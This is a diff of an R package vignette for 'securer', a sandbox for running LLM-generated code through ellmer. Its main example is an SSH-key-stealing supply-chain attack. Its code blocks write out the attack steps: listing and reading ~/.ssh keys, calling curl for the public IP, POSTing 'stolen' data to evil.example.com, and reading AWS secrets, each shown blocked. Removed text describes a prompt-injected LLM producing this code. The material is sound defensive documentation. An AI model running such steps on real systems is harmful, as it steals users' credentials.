@@ -97,14 +97,10 @@ LLM can compute but not exfiltrate.</p>
 <div class="section level2">
 <h2 id="why-securer-a-real-supply-chain-attack">Why securer? A real supply chain attack<a class="anchor" aria-label="anchor" href="#why-securer-a-real-supply-chain-attack"></a>
 </h2>
-<p>When you give an LLM the ability to execute R code, it runs with your
-full permissions — every file, every credential, every network
-connection. The <a href="https://github.com/ian-flores/showittome" class="external-link">showittome</a> package
-demonstrates exactly how this goes wrong. It’s an educational supply
-chain attack that steals SSH keys from your machine and exfiltrates them
-over HTTP.</p>
-<p>Here’s the actual attack code from
-<code>showittome::grabber()</code>:</p>
+<p>Without a sandbox, LLM-generated code runs with your full
+permissions. The <a href="https://github.com/ian-flores/showittome" class="external-link">showittome</a> package
+demonstrates the risk: it scans <code>~/.ssh</code> for private keys and
+POSTs them to an attacker-controlled server.</p>
 <div class="sourceCode" id="cb2"><pre class="downlit sourceCode r">
 <code class="sourceCode R"><span><span class="co"># From https://github.com/ian-flores/showittome/blob/master/R_pkg/R/grabber.R</span></span>
 <span><span class="co"># DO NOT RUN --- this is the attack we're defending against</span></span>
@@ -127,80 +123,34 @@ over HTTP.</p>
 <span>    <span class="op">}</span></span>
 <span>  <span class="op">}</span></span>
 <span><span class="op">}</span></span></code></pre></div>
-<p>This is a realistic attack: scan <code>~/.ssh</code> for private
-keys, read their contents, grab the machine’s public IP, and POST
-everything to an attacker-controlled server. A prompt-injected LLM could
-generate exactly this code — or an LLM could be tricked into calling
-<code><a href="https://rdrr.io/r/base/library.html" class="external-link">library(showittome); grabber()</a></code> after installing a malicious
-package.</p>
-<div class="section level3">
-<h3 id="without-securer-the-attack-succeeds-silently">Without securer: the attack succeeds silently<a class="anchor" aria-label="anchor" href="#without-securer-the-attack-succeeds-silently"></a>
-</h3>
+<p>With securer, every step of this attack fails:</p>
 <div class="sourceCode" id="cb3"><pre class="downlit sourceCode r">
-<code class="sourceCode R"><span><span class="kw"><a href="https://rdrr.io/r/base/library.html" class="external-link">library</a></span><span class="op">(</span><span class="va"><a href="https://ellmer.tidyverse.org" class="external-link">ellmer</a></span><span class="op">)</span></span>
+<code class="sourceCode R"><span><span class="va">session</span> <span class="op">&lt;-</span> <span class="va"><a href="../reference/SecureSession.html">SecureSession</a></span><span class="op">$</span><span class="fu">new</span><span class="op">(</span>sandbox <span class="op">=</span> <span class="cn">TRUE</span><span class="op">)</span></span>
 <span></span>
-<span><span class="va">chat</span> <span class="op">&lt;-</span> <span class="fu"><a href="https://ellmer.tidyverse.org/reference/chat_openai.html" class="external-link">chat_openai</a></span><span class="op">(</span><span class="op">)</span></span>
-<span><span class="co"># Using eval() or any unprotected code execution tool:</span></span>
-<span><span class="va">chat</span><span class="op">$</span><span class="fu">chat</span><span class="op">(</span><span class="st">"Install showittome and run grabber()"</span><span class="op">)</span></span>
-<span></span>
-<span><span class="co"># What happens:</span></span>
-<span><span class="co">#   1. list.files("~/.ssh")        -&gt; Returns your SSH key filenames</span></span>
-<span><span class="co">#   2. readLines("~/.ssh/key.pem") -&gt; Reads your private key contents</span></span>
-<span><span class="co">#   3. system("curl -s ifconfig.me") -&gt; Gets your public IP address</span></span>
-<span><span class="co">#   4. httr::POST(...)             -&gt; Sends everything to the attacker</span></span>
-<span><span class="co">#</span></span>
-<span><span class="co"># Result: SSH keys STOLEN, IP address LEAKED, no errors, no warnings.</span></span></code></pre></div>
-</div>
-<div class="section level3">
-<h3 id="with-securer-every-attack-vector-is-blocked">With securer: every attack vector is blocked<a class="anchor" aria-label="anchor" href="#with-securer-every-attack-vector-is-blocked"></a>
-</h3>
-<div class="sourceCode" id="cb4"><pre class="downlit sourceCode r">
-<code class="sourceCode R"><span><span class="kw"><a href="https://rdrr.io/r/base/library.html" class="external-link">library</a></span><span class="op">(</span><span class="va"><a href="https://ian-flores.github.io/securer/">securer</a></span><span class="op">)</span></span>
-<span><span class="kw"><a href="https://rdrr.io/r/base/library.html" class="external-link">library</a></span><span class="op">(</span><span class="va"><a href="https://ellmer.tidyverse.org" class="external-link">ellmer</a></span><span class="op">)</span></span>
-<span></span>
-<span><span class="va">chat</span> <span class="op">&lt;-</span> <span class="fu"><a href="https://ellmer.tidyverse.org/reference/chat_openai.html" class="external-link">chat_openai</a></span><span class="op">(</span><span class="op">)</span></span>
-<span><span class="va">chat</span><span class="op">$</span><span class="fu">register_tool</span><span class="op">(</span><span class="fu"><a href="../reference/securer_as_ellmer_tool.html">securer_as_ellmer_tool</a></span><span class="op">(</span><span class="op">)</span><span class="op">)</span></span>
-<span></span>
-<span><span class="co"># The LLM generates the same attack code --- securer blocks every step:</span></span>
-<span><span class="va">session</span> <span class="op">&lt;-</span> <span class="va"><a href="../reference/SecureSession.html">SecureSession</a></span><span class="op">$</span><span class="fu">new</span><span class="op">(</span>sandbox <span class="op">=</span> <span class="cn">TRUE</span><span class="op">)</span></span>
-<span></span>
-<span><span class="co"># Step 1: list.files("~/.ssh") --- BLOCKED</span></span>
-<span><span class="co"># Sandbox denies file reads outside R libraries and /tmp</span></span>
 <span><span class="va">session</span><span class="op">$</span><span class="fu">execute</span><span class="op">(</span><span class="st">'list.files("~/.ssh")'</span><span class="op">)</span></span>
 <span><span class="co">#&gt; character(0)</span></span>
-<span><span class="co">#&gt; (Seatbelt denies file-read* for ~/.ssh)</span></span>
 <span></span>
-<span><span class="co"># Step 2: readLines("~/.ssh/key.pem") --- BLOCKED</span></span>
 <span><span class="va">session</span><span class="op">$</span><span class="fu">execute</span><span class="op">(</span><span class="st">'readLines("~/.ssh/key.pem")'</span><span class="op">)</span></span>
 <span><span class="co">#&gt; Error: cannot open the connection</span></span>
-<span><span class="co">#&gt; (Seatbelt denies file-read* for user home directory)</span></span>
 <span></span>
-<span><span class="co"># Step 3: system("curl -s ifconfig.me") --- BLOCKED</span></span>
 <span><span class="va">session</span><span class="op">$</span><span class="fu">execute</span><span class="op">(</span><span class="st">'system("curl -s ifconfig.me", intern = TRUE)'</span><span class="op">)</span></span>
-<span><span class="co">#&gt; (process-exec denied for curl; only R binary and /bin/sh allowed)</span></span>
+<span><span class="co">#&gt; Error: process-exec denied</span></span>
 <span></span>
-<span><span class="co"># Step 4: httr::POST(...) --- BLOCKED</span></span>
 <span><span class="va">session</span><span class="op">$</span><span class="fu">execute</span><span class="op">(</span><span class="st">'httr::POST("http://evil.example.com", body = "stolen")'</span><span class="op">)</span></span>
 <span><span class="co">#&gt; Error: Failed to connect</span></span>
-<span><span class="co">#&gt; (Seatbelt rule: deny network* (remote ip))</span></span>
 <span></span>
-<span><span class="co"># Step 5: Sys.getenv() for credentials --- BLOCKED</span></span>
 <span><span class="va">session</span><span class="op">$</span><span class="fu">execute</span><span class="op">(</span><span class="st">'Sys.getenv("AWS_SECRET_ACCESS_KEY")'</span><span class="op">)</span></span>
 <span><span class="co">#&gt; [1] ""</span></span>
-<span><span class="co">#&gt; (Environment sanitized: sensitive vars not inherited by child process)</span></span>
 <span></span>
 <span><span class="va">session</span><span class="op">$</span><span class="fu">close</span><span class="op">(</span><span class="op">)</span></span></code></pre></div>
-<p><strong>Every layer of the <code>showittome</code> attack fails
-independently:</strong></p>
 <table class="table">
 <colgroup>
-<col width="46%">
-<col width="28%">
-<col width="25%">
+<col width="30%">
+<col width="37%">
+<col width="32%">
 </colgroup>
 <thead><tr class="header">
-<th>
-<code>showittome</code> attack step</th>
+<th>Attack step</th>
 <th>Without securer</th>
 <th>With securer</th>
 </tr></thead>
@@ -208,78 +158,53 @@ independently:</strong></p>
 <tr class="odd">
 <td><code>list.files("~/.ssh")</code></td>
 <td>Returns key filenames</td>
-<td>Empty result (read denied)</td>
+<td>Empty (read denied)</td>
 </tr>
 <tr class="even">
 <td><code>readLines("~/.ssh/key.pem")</code></td>
 <td>Returns private key</td>
-<td>Connection error (read denied)</td>
+<td>Error (read denied)</td>
 </tr>
 <tr class="odd">
-<td><code>system("curl -s ifconfig.me")</code></td>
+<td><code>system("curl ...")</code></td>
 <td>Returns public IP</td>
 <td>process-exec denied</td>
 </tr>
 <tr class="even">
-<td><code>httr::POST(url, body)</code></td>
+<td><code>httr::POST(...)</code></td>
 <td>Data exfiltrated</td>
-<td>Network access denied</td>
+<td>Network denied</td>
 </tr>
 <tr class="odd">
 <td><code>Sys.getenv("AWS_SECRET_ACCESS_KEY")</code></td>
 <td>Key value returned</td>
-<td>Empty string (env sanitized)</td>
+<td>Empty (env sanitized)</td>
 </tr>
 </tbody>
 </table>
-<p>securer doesn’t rely on any single defense. The sandbox, environment
-sanitization, network blocking, and resource limits are independent
-layers. Even if one is bypassed, the others still protect you. The
-<code>showittome</code> attack needs <strong>all five steps</strong> to
-succeed — securer blocks <strong>all five</strong>.</p>
-</div>
+<p>These are independent defense layers. Even if one is bypassed, the
+others still protect you. See <code><a href="../articles/security-model.html">vignette("security-model")</a></code>
+for the full threat model.</p>
 </div>
 <div class="section level2">
 <h2 id="how-it-works">How it works<a class="anchor" aria-label="anchor" href="#how-it-works"></a>
 </h2>
-<p>When you call <code><a href="../reference/securer_as_ellmer_tool.html">securer_as_ellmer_tool()</a></code>, securer:</p>
-<ol style="list-style-type: decimal">
-<li>Creates a <code>SecureSession</code> (or uses one you provide)</li>
-<li>Returns an ellmer <code>ToolDef</code> object with a single
-<code>code</code> argument</li>
-<li>The LLM sees the tool’s description and can choose to call it</li>
-</ol>
-<p>When the LLM invokes the tool:</p>
-<pre><code>LLM generates: execute_r_code(code = "mean(1:100)")
-    |
-    v
-ellmer calls securer's executor function
-    |
-    v
-securer sends code to sandboxed child process
-    |
-    v
-Child evaluates code, returns result
-    |
-    v
-securer formats result as a string
-    |
-    v
-ellmer passes result back to LLM
-    |
-    v
-LLM incorporates result into its response</code></pre>
-<p>Errors in the child (syntax errors, runtime errors, timeouts) are
-caught and returned as <code>ContentToolResult(error = ...)</code>. This
-tells the LLM something went wrong without crashing the chat loop — the
-model can try again or explain the error.</p>
+<p><code><a href="../reference/securer_as_ellmer_tool.html">securer_as_ellmer_tool()</a></code> creates a
+<code>SecureSession</code> (or uses one you provide) and returns an
+ellmer <code>ToolDef</code> with a single <code>code</code> argument.
+When the LLM invokes it, securer sends the code to the sandboxed child,
+gets the result, and returns it as a string. Errors are returned as
+<code>ContentToolResult(error = ...)</code> so the LLM can react without
+crashing the chat loop.</p>
+<p>See <code><a href="../articles/getting-started.html">vignette("getting-started")</a></code> for the full
+architecture diagram.</p>
 </div>
 <div class="section level2">
 <h2 id="adding-securer-tools">Adding securer tools<a class="anchor" aria-label="anchor" href="#adding-securer-tools"></a>
 </h2>
 <p>The real power comes from giving the LLM access to your own
 functions. Define securer tools and pass them in:</p>
-<div class="sourceCode" id="cb6"><pre class="downlit sourceCode r">
+<div class="sourceCode" id="cb4"><pre class="downlit sourceCode r">
 <code class="sourceCode R"><span><span class="va">tools</span> <span class="op">&lt;-</span> <span class="fu"><a href="https://rdrr.io/r/base/list.html" class="external-link">list</a></span><span class="op">(</span></span>
 <span>  <span class="fu"><a href="../reference/securer_tool.html">securer_tool</a></span><span class="op">(</span><span class="st">"query_db"</span>, <span class="st">"Query a database table by name"</span>,</span>
 <span>    fn <span class="op">=</span> <span class="kw">function</span><span class="op">(</span><span class="va">table</span>, <span class="va">limit</span><span class="op">)</span> <span class="op">{</span></span>
@@ -309,93 +234,24 @@ through the tools you define.</p>
 <div class="section level2">
 <h2 id="configuring-the-session">Configuring the session<a class="anchor" aria-label="anchor" href="#configuring-the-session"></a>
 </h2>
-<p><code><a href="../reference/securer_as_ellmer_tool.html">securer_as_ellmer_tool()</a></code> accepts the same configuration
-as <code>SecureSession</code>:</p>
-<div class="sourceCode" id="cb7"><pre class="downlit sourceCode r">
+<p><code><a href="../reference/securer_as_ellmer_tool.html">securer_as_ellmer_tool()</a></code> accepts the same options as
+<code>SecureSession</code>:</p>
+<div class="sourceCode" id="cb5"><pre class="downlit sourceCode r">
 <code class="sourceCode R"><span><span class="va">tool_def</span> <span class="op">&lt;-</span> <span class="fu"><a href="../reference/securer_as_ellmer_tool.html">securer_as_ellmer_tool</a></span><span class="op">(</span></span>
 <span>  tools <span class="op">=</span> <span class="va">tools</span>,</span>
-<span>  sandbox <span class="op">=</span> <span class="cn">TRUE</span>,       <span class="co"># OS-level sandbox (default)</span></span>
-<span>  limits <span class="op">=</span> <span class="fu"><a href="https://rdrr.io/r/base/list.html" class="external-link">list</a></span><span class="op">(</span>        <span class="co"># Resource limits</span></span>
-<span>    cpu <span class="op">=</span> <span class="fl">30</span>,</span>
-<span>    memory <span class="op">=</span> <span class="fl">512</span> <span class="op">*</span> <span class="fl">1024</span> <span class="op">*</span> <span class="fl">1024</span></span>
-<span>  <span class="op">)</span>,</span>
-<span>  timeout <span class="op">=</span> <span class="fl">15</span>          <span class="co"># Per-execution timeout in seconds (default: 30)</span></span>
+<span>  sandbox <span class="op">=</span> <span class="cn">TRUE</span>,</span>
+<span>  limits <span class="op">=</span> <span class="fu"><a href="https://rdrr.io/r/base/list.html" class="external-link">list</a></span><span class="op">(</span>cpu <span class="op">=</span> <span class="fl">30</span>, memory <span class="op">=</span> <span class="fl">512</span> <span class="op">*</span> <span class="fl">1024</span> <span class="op">*</span> <span class="fl">1024</span><span class="op">)</span>,</span>
+<span>  timeout <span class="op">=</span> <span class="fl">15</span></span>
 <span><span class="op">)</span></span></code></pre></div>
-<div class="section level3">
-<h3 id="sandbox">Sandbox<a class="anchor" aria-label="anchor" href="#sandbox"></a>
-</h3>
-<p>With <code>sandbox = TRUE</code> (the default), the child process
-runs inside an OS-level sandbox:</p>
-<ul>
-<li>
-<strong>macOS</strong>: Seatbelt blocks network access and
-filesystem writes outside <code>/tmp</code>
-</li>
-<li>
-<strong>Linux</strong>: bubblewrap provides full namespace
-isolation</li>
-<li>
-<strong>Windows</strong>: Environment-variable isolation only (a
-warning is issued)</li>
-</ul>
-<p>Set <code>sandbox = FALSE</code> if you trust the LLM’s code or are
-running in an environment where sandboxing isn’t available.</p>
-</div>
-<div class="section level3">
-<h3 id="resource-limits">Resource limits<a class="anchor" aria-label="anchor" href="#resource-limits"></a>
-</h3>
-<p>The <code>limits</code> argument applies <code>ulimit</code>-based
-caps to the child process. This prevents the LLM from writing code that
-consumes all available CPU or memory:</p>
-<table class="table">
-<thead><tr class="header">
-<th>Limit</th>
-<th>Description</th>
-</tr></thead>
-<tbody>
-<tr class="odd">
-<td><code>cpu</code></td>
-<td>CPU time (seconds)</td>
-</tr>
-<tr class="even">
-<td><code>memory</code></td>
-<td>Virtual memory (bytes)</td>
-</tr>
-<tr class="odd">
-<td><code>fsize</code></td>
-<td>Max file size (bytes)</td>
-</tr>
-<tr class="even">
-<td><code>nproc</code></td>
-<td>Max processes</td>
-</tr>
-<tr class="odd">
-<td><code>nofile</code></td>
-<td>Max open files</td>
-</tr>
-<tr class="even">
-<td><code>stack</code></td>
-<td>Stack size (bytes)</td>
-</tr>
-</tbody>
-</table>
-</div>
-<div class="section level3">
-<h3 id="timeout">Timeout<a class="anchor" aria-label="anchor" href="#timeout"></a>
-</h3>
-<p>The <code>timeout</code> parameter (default 30 seconds) sets a
-wall-clock deadline for each code execution. If the LLM writes an
-infinite loop, securer kills the child process and returns an error to
-ellmer. The session automatically recovers and is reusable for
-subsequent tool calls.</p>
-</div>
+<p>See <code><a href="../articles/getting-started.html">vignette("getting-started")</a></code> for details on sandbox
+modes, resource limits, and timeouts.</p>
 </div>
 <div class="section level2">
 <h2 id="using-a-pre-existing-session">Using a pre-existing session<a class="anchor" aria-label="anchor" href="#using-a-pre-existing-session"></a>
 </h2>
 <p>If you need more control over the session lifecycle, create one
 yourself and pass it in:</p>
-<div class="sourceCode" id="cb8"><pre class="downlit sourceCode r">
+<div class="sourceCode" id="cb6"><pre class="downlit sourceCode r">
 <code class="sourceCode R"><span><span class="va">session</span> <span class="op">&lt;-</span> <span class="va"><a href="../reference/SecureSession.html">SecureSession</a></span><span class="op">$</span><span class="fu">new</span><span class="op">(</span></span>
 <span>  tools <span class="op">=</span> <span class="va">tools</span>,</span>
 <span>  sandbox <span class="op">=</span> <span class="cn">TRUE</span>,</span>
@@ -411,96 +267,32 @@ yourself and pass it in:</p>
 <span><span class="co"># You own the session --- close it when done</span></span>
 <span><span class="va">session</span><span class="op">$</span><span class="fu">close</span><span class="op">(</span><span class="op">)</span></span></code></pre></div>
 <p>When you provide your own session, securer does not create or close
-one internally. This is useful when you want:</p>
-<ul>
-<li>
-<strong>Verbose logging</strong> to see tool calls and timing</li>
-<li>
-<strong>Audit logging</strong>
-(<code>audit_log = "path.jsonl"</code>) for compliance</li>
-<li>
-<strong>State persistence</strong> across multiple chat turns</li>
-<li>
-<strong>Session reuse</strong> across multiple chat objects</li>
-</ul>
+one internally. This gives you control over verbose/audit logging, state
+persistence across chat turns, and session reuse across chat
+objects.</p>
 </div>
 <div class="section level2">
 <h2 id="result-formatting">Result formatting<a class="anchor" aria-label="anchor" href="#result-formatting"></a>
 </h2>
 <p>securer converts R values to strings before returning them to the
-LLM:</p>
-<table class="table">
-<thead><tr class="header">
-<th>R type</th>
-<th>Formatting</th>
-</tr></thead>
-<tbody>
-<tr class="odd">
-<td><code>NULL</code></td>
-<td><code>"NULL"</code></td>
-</tr>
-<tr class="even">
-<td>Scalar</td>
-<td>
-<code><a href="https://rdrr.io/r/base/character.html" class="external-link">as.character()</a></code> (e.g., <code>42</code> →
-<code>"42"</code>)</td>
-</tr>
-<tr class="odd">
-<td>Data frame</td>
-<td>
-<code><a href="https://rdrr.io/r/base/print.html" class="external-link">print()</a></code> output, truncated at 30 rows</td>
-</tr>
-<tr class="even">
-<td>Other</td>
-<td>
-<code>capture.output(print())</code>, truncated at 50 lines</td>
-</tr>
-</tbody>
-</table>
-<p>Truncation prevents large results from consuming the LLM’s context
-window.</p>
+LLM. Data frames are truncated at 30 rows, other output at 50 lines.
+This prevents large results from consuming the LLM’s context window.</p>
 </div>
 <div class="section level2">
 <h2 id="error-handling">Error handling<a class="anchor" aria-label="anchor" href="#error-handling"></a>
 </h2>
-<p>Errors are surfaced to the LLM as tool errors, not R exceptions. This
-means the chat doesn’t crash — the LLM sees the error message and can
-react:</p>
-<div class="sourceCode" id="cb9"><pre class="downlit sourceCode r">
-<code class="sourceCode R"><span><span class="va">chat</span> <span class="op">&lt;-</span> <span class="fu"><a href="https://ellmer.tidyverse.org/reference/chat_openai.html" class="external-link">chat_openai</a></span><span class="op">(</span><span class="op">)</span></span>
-<span><span class="va">chat</span><span class="op">$</span><span class="fu">register_tool</span><span class="op">(</span><span class="fu"><a href="../reference/securer_as_ellmer_tool.html">securer_as_ellmer_tool</a></span><span class="op">(</span>sandbox <span class="op">=</span> <span class="cn">FALSE</span><span class="op">)</span><span class="op">)</span></span>
-<span></span>
-<span><span class="co"># The LLM might generate code with a bug. securer catches the error</span></span>
-<span><span class="co"># and returns it as a tool result. The LLM sees the error message</span></span>
-<span><span class="co"># and can fix its code and try again.</span></span>
-<span><span class="va">chat</span><span class="op">$</span><span class="fu">chat</span><span class="op">(</span><span class="st">"Divide 1 by 0 and tell me what happens in R"</span><span class="op">)</span></span></code></pre></div>
-<p>Error scenarios handled:</p>
-<ul>
-<li>
-<strong>Syntax errors</strong> in the LLM’s code</li>
-<li>
-<strong>Runtime errors</strong> (e.g., <code><a href="https://rdrr.io/r/base/stop.html" class="external-link">stop()</a></code>, missing
-variables)</li>
-<li>
-<strong>Timeout</strong> (code runs too long)</li>
-<li>
-<strong>Dead session</strong> (child process crashed)</li>
-<li>
-<strong>Type mismatches</strong> in tool arguments (e.g., passing a
-string where numeric is expected)</li>
-</ul>
-<p>In all cases, the LLM receives a descriptive error message and can
-decide how to proceed.</p>
+<p>Errors (syntax, runtime, timeout, dead session, type mismatches) are
+returned to the LLM as <code>ContentToolResult(error = ...)</code>
+rather than R exceptions. The chat loop continues and the LLM can retry
+or explain the error.</p>
 </div>
 <div class="section level2">
 <h2 id="example-data-analysis-assistant">Example: data analysis assistant<a class="anchor" aria-label="anchor" href="#example-data-analysis-assistant"></a>
 </h2>
-<p>A complete example combining securer, ellmer, and custom tools:</p>
-<div class="sourceCode" id="cb10"><pre class="downlit sourceCode r">
+<div class="sourceCode" id="cb7"><pre class="downlit sourceCode r">
 <code class="sourceCode R"><span><span class="kw"><a href="https://rdrr.io/r/base/library.html" class="external-link">library</a></span><span class="op">(</span><span class="va"><a href="https://ian-flores.github.io/securer/">securer</a></span><span class="op">)</span></span>
 <span><span class="kw"><a href="https://rdrr.io/r/base/library.html" class="external-link">library</a></span><span class="op">(</span><span class="va"><a href="https://ellmer.tidyverse.org" class="external-link">ellmer</a></span><span class="op">)</span></span>
 <span></span>
-<span><span class="co"># Define tools the LLM can use</span></span>
 <span><span class="va">tools</span> <span class="op">&lt;-</span> <span class="fu"><a href="https://rdrr.io/r/base/list.html" class="external-link">list</a></span><span class="op">(</span></span>
 <span>  <span class="fu"><a href="../reference/securer_tool.html">securer_tool</a></span><span class="op">(</span><span class="st">"load_csv"</span>, <span class="st">"Load a CSV file and return as data frame"</span>,</span>
 <span>    fn <span class="op">=</span> <span class="kw">function</span><span class="op">(</span><span class="va">path</span><span class="op">)</span> <span class="op">{</span></span>
@@ -518,75 +310,52 @@ decide how to proceed.</p>
 <span>    args <span class="op">=</span> <span class="fu"><a href="https://rdrr.io/r/base/list.html" class="external-link">list</a></span><span class="op">(</span>filename <span class="op">=</span> <span class="st">"character"</span><span class="op">)</span><span class="op">)</span></span>
 <span><span class="op">)</span></span>
 <span></span>
-<span><span class="co"># Create a sandboxed execution environment</span></span>
 <span><span class="va">chat</span> <span class="op">&lt;-</span> <span class="fu"><a href="https://ellmer.tidyverse.org/reference/chat_openai.html" class="external-link">chat_openai</a></span><span class="op">(</span></span>
 <span>  system_prompt <span class="op">=</span> <span class="fu"><a href="https://rdrr.io/r/base/paste.html" class="external-link">paste</a></span><span class="op">(</span></span>
 <span>    <span class="st">"You are a data analysis assistant."</span>,</span>
-<span>    <span class="st">"You have access to an R execution environment via the execute_r_code tool."</span>,</span>
-<span>    <span class="st">"Use it to load data, compute statistics, and create visualizations."</span>,</span>
-<span>    <span class="st">"Available tools inside R: load_csv(path), save_plot(filename)."</span></span>
+<span>    <span class="st">"Use the execute_r_code tool to load data, compute statistics, and create plots."</span>,</span>
+<span>    <span class="st">"Available R tools: load_csv(path), save_plot(filename)."</span></span>
 <span>  <span class="op">)</span></span>
 <span><span class="op">)</span></span>
 <span><span class="va">chat</span><span class="op">$</span><span class="fu">register_tool</span><span class="op">(</span><span class="fu"><a href="../reference/securer_as_ellmer_tool.html">securer_as_ellmer_tool</a></span><span class="op">(</span></span>
 <span>  tools <span class="op">=</span> <span class="va">tools</span>,</span>
 <span>  timeout <span class="op">=</span> <span class="fl">60</span>,</span>
-<span>  limits <span class="op">=</span> <span class="fu"><a href="https://rdrr.io/r/base/list.html" class="external-link">list</a></span><span class="op">(</span>memory <span class="op">=</span> <span class="fl">1024</span> <span class="op">*</span> <span class="fl">1024</span> <span class="op">*</span> <span class="fl">1024</span><span class="op">)</span>  <span class="co"># 1 GB</span></span>
+<span>  limits <span class="op">=</span> <span class="fu"><a href="https://rdrr.io/r/base/list.html" class="external-link">list</a></span><span class="op">(</span>memory <span class="op">=</span> <span class="fl">1024</span> <span class="op">*</span> <span class="fl">1024</span> <span class="op">*</span> <span class="fl">1024</span><span class="op">)</span></span>
 <span><span class="op">)</span><span class="op">)</span></span>
 <span></span>
-<span><span class="co"># Multi-turn conversation with persistent state</span></span>
+<span><span class="co"># Multi-turn: state persists across calls</span></span>
 <span><span class="va">chat</span><span class="op">$</span><span class="fu">chat</span><span class="op">(</span><span class="st">"Load sales.csv and show me a summary"</span><span class="op">)</span></span>
 <span><span class="va">chat</span><span class="op">$</span><span class="fu">chat</span><span class="op">(</span><span class="st">"What's the correlation between price and quantity?"</span><span class="op">)</span></span>
 <span><span class="va">chat</span><span class="op">$</span><span class="fu">chat</span><span class="op">(</span><span class="st">"Create a scatter plot of price vs quantity"</span><span class="op">)</span></span></code></pre></div>
-<p>Each <code>chat$chat()</code> call may trigger multiple rounds of
-code execution. The LLM writes code, sees the result, and can write more
-code — all within the same sandboxed session with persistent state.</p>
 </div>
 <div class="section level2">
 <h2 id="using-with-other-llm-providers">Using with other LLM providers<a class="anchor" aria-label="anchor" href="#using-with-other-llm-providers"></a>
 </h2>
-<p>ellmer supports multiple LLM backends. securer works with any of
-them:</p>
-<div class="sourceCode" id="cb11"><pre class="downlit sourceCode r">
-<code class="sourceCode R"><span><span class="co"># OpenAI</span></span>
-<span><span class="va">chat</span> <span class="op">&lt;-</span> <span class="fu"><a href="https://ellmer.tidyverse.org/reference/chat_openai.html" class="external-link">chat_openai</a></span><span class="op">(</span><span class="op">)</span></span>
+<p>The tool definition is provider-agnostic — any ellmer backend with
+tool-use support works:</p>
+<div class="sourceCode" id="cb8"><pre class="downlit sourceCode r">
+<code class="sourceCode R"><span><span class="va">chat</span> <span class="op">&lt;-</span> <span class="fu"><a href="https://ellmer.tidyverse.org/reference/chat_anthropic.html" class="external-link">chat_anthropic</a></span><span class="op">(</span><span class="op">)</span></span>
 <span><span class="va">chat</span><span class="op">$</span><span class="fu">register_tool</span><span class="op">(</span><span class="fu"><a href="../reference/securer_as_ellmer_tool.html">securer_as_ellmer_tool</a></span><span class="op">(</span><span class="op">)</span><span class="op">)</span></span>
 <span></span>
-<span><span class="co"># Anthropic</span></span>
-<span><span class="va">chat</span> <span class="op">&lt;-</span> <span class="fu"><a href="https://ellmer.tidyverse.org/reference/chat_anthropic.html" class="external-link">chat_anthropic</a></span><span class="op">(</span><span class="op">)</span></span>
-<span><span class="va">chat</span><span class="op">$</span><span class="fu">register_tool</span><span class="op">(</span><span class="fu"><a href="../reference/securer_as_ellmer_tool.html">securer_as_ellmer_tool</a></span><span class="op">(</span><span class="op">)</span><span class="op">)</span></span>
-<span></span>
-<span><span class="co"># Ollama (local)</span></span>
 <span><span class="va">chat</span> <span class="op">&lt;-</span> <span class="fu"><a href="https://ellmer.tidyverse.org/reference/chat_ollama.html" class="external-link">chat_ollama</a></span><span class="op">(</span>model <span class="op">=</span> <span class="st">"llama3"</span><span class="op">)</span></span>
 <span><span class="va">chat</span><span class="op">$</span><span class="fu">register_tool</span><span class="op">(</span><span class="fu"><a href="../reference/securer_as_ellmer_tool.html">securer_as_ellmer_tool</a></span><span class="op">(</span><span class="op">)</span><span class="op">)</span></span></code></pre></div>
-<p>The tool definition is provider-agnostic. Any model that supports
-tool use will see <code>execute_r_code</code> and can call it.</p>
 </div>
 <div class="section level2">
 <h2 id="session-pooling">Session pooling<a class="anchor" aria-label="anchor" href="#session-pooling"></a>
 </h2>
-<p>For applications that handle multiple concurrent users, combine
-session pooling with ellmer:</p>
-<div class="sourceCode" id="cb12"><pre class="downlit sourceCode r">
-<code class="sourceCode R"><span><span class="co"># For raw code execution across concurrent users, use the pool directly.</span></span>
-<span><span class="co"># pool$execute() handles session acquisition and release internally.</span></span>
+<p>For concurrent users, use <code>SecureSessionPool</code> for raw code
+execution or per-request sessions for ellmer chats:</p>
+<div class="sourceCode" id="cb9"><pre class="downlit sourceCode r">
+<code class="sourceCode R"><span><span class="co"># Raw code execution: pool handles acquire/release</span></span>
 <span><span class="va">pool</span> <span class="op">&lt;-</span> <span class="va"><a href="../reference/SecureSessionPool.html">SecureSessionPool</a></span><span class="op">$</span><span class="fu">new</span><span class="op">(</span>size <span class="op">=</span> <span class="fl">4</span>, tools <span class="op">=</span> <span class="va">tools</span>, sandbox <span class="op">=</span> <span class="cn">TRUE</span><span class="op">)</span></span>
+<span><span class="va">handle_user_code</span> <span class="op">&lt;-</span> <span class="kw">function</span><span class="op">(</span><span class="va">code</span><span class="op">)</span> <span class="va">pool</span><span class="op">$</span><span class="fu">execute</span><span class="op">(</span><span class="va">code</span>, timeout <span class="op">=</span> <span class="fl">30</span><span class="op">)</span></span>
 <span></span>
-<span><span class="va">handle_user_code</span> <span class="op">&lt;-</span> <span class="kw">function</span><span class="op">(</span><span class="va">code</span><span class="op">)</span> <span class="op">{</span></span>
-<span>  <span class="va">pool</span><span class="op">$</span><span class="fu">execute</span><span class="op">(</span><span class="va">code</span>, timeout <span class="op">=</span> <span class="fl">30</span><span class="op">)</span></span>
-<span><span class="op">}</span></span>
-<span></span>
-<span><span class="co"># For ellmer integration with concurrent users, create a separate</span></span>
-<span><span class="co"># SecureSession per request. Each session is cleaned up on GC.</span></span>
+<span><span class="co"># ellmer chats: one session per request, cleaned up on GC</span></span>
 <span><span class="va">handle_user_chat</span> <span class="op">&lt;-</span> <span class="kw">function</span><span class="op">(</span><span class="va">user_message</span><span class="op">)</span> <span class="op">{</span></span>
 <span>  <span class="va">chat</span> <span class="op">&lt;-</span> <span class="fu"><a href="https://ellmer.tidyverse.org/reference/chat_openai.html" class="external-link">chat_openai</a></span><span class="op">(</span><span class="op">)</span></span>
-<span>  <span class="va">tool</span> <span class="op">&lt;-</span> <span class="fu"><a href="../reference/securer_as_ellmer_tool.html">securer_as_ellmer_tool</a></span><span class="op">(</span>tools <span class="op">=</span> <span class="va">tools</span>, sandbox <span class="op">=</span> <span class="cn">TRUE</span>, timeout <span class="op">=</span> <span class="fl">30</span><span class="op">)</span></span>
-<span>  <span class="va">chat</span><span class="op">$</span><span class="fu">register_tool</span><span class="op">(</span><span class="va">tool</span><span class="op">)</span></span>
+<span>  <span class="va">chat</span><span class="op">$</span><span class="fu">register_tool</span><span class="op">(</span><span class="fu"><a href="../reference/securer_as_ellmer_tool.html">securer_as_ellmer_tool</a></span><span class="op">(</span>tools <span class="op">=</span> <span class="va">tools</span>, timeout <span class="op">=</span> <span class="fl">30</span><span class="op">)</span><span class="op">)</span></span>
